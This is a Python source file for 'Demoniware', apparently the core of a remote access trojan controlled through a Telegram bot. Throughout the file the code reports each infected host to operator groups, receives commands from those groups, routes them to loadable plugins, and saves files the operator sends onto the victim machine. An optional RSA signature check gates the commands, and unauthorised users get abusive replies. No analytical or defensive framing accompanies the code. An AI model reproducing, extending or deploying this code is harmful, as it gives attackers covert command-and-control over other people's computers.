import configparser
from datetime import datetime
import tempfile
import textwrap
import uuid
import telepot
import os
import sys
import platform

import logging

from time import sleep, gmtime, strftime

from Crypto.PublicKey import RSA
from Crypto.Hash import SHA256

from threading import Thread

from plugins import load_plugin


class Demoniware(object):


    def __init__(self, config_file, api_key=None, allowed_groups=None):
        formatter = logging.Formatter('%(asctime)s %(message)s')
        self.logger = logging.getLogger(__name__)
        self.logger.setLevel(logging.DEBUG)

        ch_stream = logging.StreamHandler()
        ch_stream.setLevel(logging.INFO)
        ch_stream.setFormatter(formatter)

        self.logger.addHandler(ch_stream)

        self.logger.info('Demoniware is rising...')

        self.config = configparser.ConfigParser()
        self.config.read(config_file) 

        self.api_key = api_key if api_key else self.config['Demoniware'].get('api_key', '')
        self.allowed_groups = allowed_groups if allowed_groups else [int(x) for x in self.config['Demoniware'].get('allowed_groups', []).split(',')]
        self.max_message_length = self.config['Telegram'].getint('max_message_length', 4096)
        self.socket_buffer_size = self.config['Socket'].getint('buffer_size', 1024)

        self.secure = self.config['Demoniware'].getboolean('secure', False)

        self.bot = telepot.Bot(self.api_key)
        self.platform = sys.platform
        self.system = platform.system()


        self.start_time = datetime.now()

        self.node = '{}__{}'.format(platform.node(), uuid.getnode())

        self.plugin_list = [x.strip() for x in self.config['Demoniware'].get('plugins', []).split(',')]

        self.plugins = {}

        self.command_routes = {}

    def load_plugins(self):
        for p in self.plugin_list:
            try:
                self.logger.info('[*] Loading plugin: {}'.format(p))
                self.plugins[p] = load_plugin(self, p)
                new_cmd = []

                self.plugins[p].setup()

                for command in self.plugins[p].commands:
                    if self.command_routes.get(command.name, None):
                        self.logger.warning('[-] Duplicated command "{}" for plugins "{}" and "{}", prioritizing first'.format(command.name, self.command_routes[command.name], p))
                    else:
                        self.command_routes[command.name] = p
                        new_cmd.append(command.name)

                self.logger.info('[+] Plugin loaded: {} ({} @ {}), new commands: {}'.format(p, self.plugins[p].name, self.plugins[p].version, new_cmd))
            except Exception as e:
                self.logger.error('[-] Error loading plugin: {} ({})'.format(p, str(e)))
                continue

    def send_message(self, chat_id, msg):
        chunks = textwrap.wrap(msg, width=self.max_message_length - 500, expand_tabs=False, replace_whitespace=False, drop_whitespace=False, break_long_words=True)

        for chunk in chunks:
            self.bot.sendMessage(chat_id, '[{}] {}'.format(self.node, chunk))

    def handle(self, msg):
        content_type, chat_type, chat_id = telepot.glance(msg)

        if chat_type == 'group':
            if chat_id in self.allowed_groups:
                if content_type == 'text':
                    if self.secure:
                        self.check_sign(msg)
                    else:
                        self.actions(msg['text'], chat_id)
                elif content_type == 'document':
                    self.bot.download_file(msg['document']['file_id'], msg['document']['file_name'])
                    self.send_message(chat_id, 'The file {fname} has been saved to {cwd}'.format(fname=msg['document']['file_name'], cwd=os.getcwd()))
        else:
            self.send_message(chat_id, 'Fuck off!')

    def check_sign(self, msg):
        cmd = msg['text'].split()
        chat_id = msg['chat']['id']

        #Change to your public key
        public = '''-----BEGIN PUBLIC KEY-----
        MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCqJpBxEQ53eNjxj3lS1cZ21g+8
        wyY6ZailtjKKvu8Q8B7bKlZI0/v13SPGGose2EY54//ceRAfSnZ4XMXLHBzVq2+I
        +ryUypsDhBhTPGgOLdnX2sPU39xSQixhkB8n1T4Dlj/mdfVBS2bgjjWcSvXkCULN
        rKzcuJk/193tuTcK3wIDAQAB
        -----END PUBLIC KEY-----
        '''

        msg = ' '.join(cmd[1:])
        key = RSA.importKey(public)
        public = key.publickey()
        now = strftime("%Y-%m-%d %H:%M", gmtime())
        msg_final = '{}{}'.format(msg, now).encode('utf-8')
        hash_msg = SHA256.new(msg_final).digest()
        signature = (int(cmd[0]),)
        if public.verify(hash_msg, signature):
            self.actions(' '.join(cmd[1:]), chat_id)
        else:
            self.send_message(chat_id, 'Get out bastard')

    def actions(self, msg, chat_id):
        cmd = msg.split()

        if '/hosts' in cmd[0]:
            self.send_message(chat_id, '{} [started at {}]'.format(self.node, self.start_time))

        elif cmd[0].lower() in self.node.lower() and len(cmd) >= 2:
            if cmd[1] in self.command_routes.keys():
                pname = self.command_routes[cmd[1]]
                plugin = self.plugins[pname]

                self.logger.debug('[*] Routing command: "{}" => "{}"'.format(cmd[1], pname))

                plugin.handle(cmd[1], chat_id, *cmd[2:])



        elif '/help' in cmd[0]:
            msg = """[+] - Commands Available - [+]
            /help - show this message
            /hosts - show the hostname of all hosts availables"""

            for plugin in self.plugins.keys():
                msg += """\n\n[+] - Plugin: {plugin_name} - [+]""".format(plugin_name=plugin)
                
                for cmd in self.plugins[plugin].commands:
                    msg += '\n{usage}'.format(usage=self.plugins[plugin].get_usage(cmd.name))

            self.send_message(chat_id, msg)


    def get_tmp(self, fname):
        tmp = tempfile.gettempdir()
        return os.path.join(tmp, fname)

    def generate_file_name(self, fname):
        return '{}__{}__{}'.format(platform.node(), datetime.now().strftime('%Y%m%d_%H%M%S'), fname)


    def not_implemented(self, chat_id):
        return self.send_message(chat_id, 'Not yet implemented on {}'.format(self.platform))

    def main(self):
        msg = 'NEW {} HOST'.format(self.system, self.node)

        for group in self.allowed_groups:
            try:
                self.send_message(group, msg)
            except:
                continue

        self.bot.message_loop(self.handle)
        while 1:
            sleep(10)

if __name__ == "__main__":

    demon = Demoniware('demoniware.ini')
    demon.load_plugins()
    demon.main()